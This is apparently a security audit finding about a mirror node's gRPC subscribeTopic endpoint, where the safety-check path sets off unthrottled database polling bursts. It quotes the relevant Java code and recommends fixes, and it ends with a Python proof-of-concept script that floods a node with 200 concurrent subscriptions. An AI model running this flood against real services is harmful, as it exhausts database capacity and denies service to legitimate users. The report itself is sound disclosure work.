### Title
Unprivileged gRPC Subscriber Can Trigger Unthrottled Database Polling Burst via Safety-Check Path

### Summary
Any unauthenticated gRPC client subscribing to a topic automatically triggers the unthrottled code path in `PollingTopicMessageRetriever` after one second via the built-in safety-check mechanism. With default settings of `maxPolls=12`, `pollingFrequency=20ms`, and `maxPageSize=5000`, each subscription generates up to 60,000 database row fetches in ~240ms. Because there is no per-IP or global subscription rate limit, an attacker opening many concurrent subscriptions can saturate database I/O across mirror-node replicas.

### Finding Description

**Exact code path:**

`TopicMessageServiceImpl.subscribeTopic()` unconditionally constructs a safety-check flux for every subscription:

```java
// TopicMessageServiceImpl.java lines 67-70
Flux<TopicMessage> safetyCheck = Mono.delay(Duration.ofSeconds(1L))
    .filter(_ -> !topicContext.isComplete())
    .flatMapMany(_ -> missingMessages(topicContext, null))
    .subscribeOn(Schedulers.boundedElastic());
``` [1](#0-0) 

`topicContext.isComplete()` returns `false` whenever `endTime == null`:

```java
// TopicMessageServiceImpl.java lines 203-205
boolean isComplete() {
    if (filter.getEndTime() == null) {
        return false;
    }
``` [2](#0-1) 

So for any subscription without an explicit `endTime` (the common case), the safety check fires after 1 second and calls `missingMessages(topicContext, null)`, which routes to the **unthrottled** retriever:

```java
// TopicMessageServiceImpl.java line 149
return topicMessageRetriever.retrieve(gapFilter, false);
``` [3](#0-2) 

The `gapFilter` is built without a `limit`, so `hasLimit()` returns false.

**Root cause — `isComplete()` never returns true in unthrottled mode without a limit:**

```java
// PollingTopicMessageRetriever.java lines 121-128
boolean isComplete() {
    boolean limitHit = filter.hasLimit() && filter.getLimit() == total.get();
    if (throttled) {
        return pageSize.get() < retrieverProperties.getMaxPageSize() || limitHit;
    }
    return limitHit;   // ← always false when no limit is set
}
``` [4](#0-3) 

Because `isComplete()` always returns false, `RepeatSpec.create(r -> !context.isComplete(), context.getNumRepeats())` runs the full `numRepeats` (12) polls:

```java
// PollingTopicMessageRetriever.java lines 51-55
return Flux.defer(() -> poll(context))
    .repeatWhen(RepeatSpec.create(r -> !context.isComplete(), context.getNumRepeats())
        .jitter(0.1)
        .withFixedDelay(context.getFrequency())
        .withScheduler(scheduler))
``` [5](#0-4) 

**Default unthrottled parameters (hardcoded in `RetrieverProperties`):**

```java
// RetrieverProperties.java lines 36-47
public static class UnthrottledProperties {
    @Min(1000)
    private int maxPageSize = 5000;
    @Min(4)
    private long maxPolls = 12;
    @DurationMin(millis = 10)
    private Duration pollingFrequency = Duration.ofMillis(20);
}
``` [6](#0-5) 

Result per subscription: **12 polls × 5,000 rows = 60,000 DB rows in ~240ms**.

### Impact Explanation

Each subscription that lacks an `endTime` automatically triggers a burst of up to 60,000 database row fetches within ~240ms. With N concurrent subscriptions from a single attacker (each connection allows up to 5 concurrent calls per `maxConcurrentCallsPerConnection=5`, and multiple connections are permitted), the aggregate DB read load scales linearly with no server-side enforcement ceiling. This can exhaust database I/O capacity, connection pool threads, and memory on mirror-node replicas, potentially degrading or halting topic message delivery for all legitimate users — matching the stated impact of disrupting 30%+ of network processing nodes.

### Likelihood Explanation

The attack requires zero privileges: the gRPC `subscribeTopic` endpoint is publicly accessible, no authentication is enforced, and the only input needed is a valid `topicId` (easily enumerated from the public ledger). The safety-check trigger is automatic and unconditional — the attacker does not need to craft any special message, only open subscriptions and wait one second. The attack is trivially scriptable, repeatable, and can be amplified by opening connections from multiple IPs.

### Recommendation

1. **Fix `isComplete()` for unthrottled mode**: When no limit is set, treat a page smaller than `maxPageSize` as a completion signal (mirror the throttled logic), preventing the full 12-poll burst when the DB has no more data.
2. **Enforce a global or per-IP concurrent subscription limit**: The `subscriberCount` gauge is monitoring-only; add an enforced ceiling (e.g., reject new subscriptions when count exceeds a threshold).
3. **Require `endTime` or a `limit` for unthrottled retrieval**: Before calling `retrieve(..., false)`, assert that the filter has a bounded scope.
4. **Add rate limiting at the gRPC layer**: Use a token-bucket or leaky-bucket per source IP to cap subscription creation rate.

### Proof of Concept

```python
import grpc, threading
# Assumes proto stubs for ConsensusService are generated
from com.hedera.mirror.api.proto import consensus_service_pb2_grpc, consensus_service_pb2

def flood(channel):
    stub = consensus_service_pb2_grpc.ConsensusServiceStub(channel)
    req = consensus_service_pb2.ConsensusTopicQuery(
        topicID=...,          # any valid topic ID
        consensusStartTime=0, # no endTime set → safety check fires after 1s
    )
    for _ in stub.subscribeTopic(req):
        pass  # consume stream to keep subscription alive past 1s

channels = [grpc.insecure_channel("mirror-node:5600") for _ in range(200)]
threads  = [threading.Thread(target=flood, args=(c,)) for c in channels]
for t in threads: t.start()
# After ~1 second, each subscription triggers 12 × 5000-row DB queries in 240ms
# 200 subscriptions × 60,000 rows = 12,000,000 DB rows fetched in ~240ms
```
